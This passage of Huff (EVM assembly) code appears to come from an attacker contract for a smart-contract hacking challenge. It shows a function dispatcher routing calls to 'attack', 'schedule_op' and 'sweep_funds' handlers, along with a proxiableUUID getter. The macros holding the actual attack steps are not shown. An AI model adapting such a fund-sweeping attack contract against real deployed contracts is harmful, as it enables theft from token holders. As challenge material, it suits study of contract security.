    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0xbee09e17   // [0xbee09e17, func_sig, func_sig] - pushing func sig of 'schedule_op()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    schedule     // [schedule, 0/1, func_sig] - schedule is a label (byte offset) for the schedule_op instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x065c5014   // [0x065c5014, func_sig, func_sig] - pushing func sig of 'sweep_funds(address,address)' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    sweep        // [sweep, 0/1, func_sig] - sweep is a label (byte offset) for the sweep_funds instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
    
    throw_error: // label for revert path
        0x00 0x00 revert

    uuid:        // label for proxiableUUID getter instructions
        PROXIABLE_UUID()

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()

    schedule:    // label for scheule instructions
        SCHEDULE_OP()

    sweep:       // label for sweep funds instructions
        0x24
        calldataload  // [token]
        0x04
        calldataload  //[owner, token]
        SWEEP_FUNDS()
}
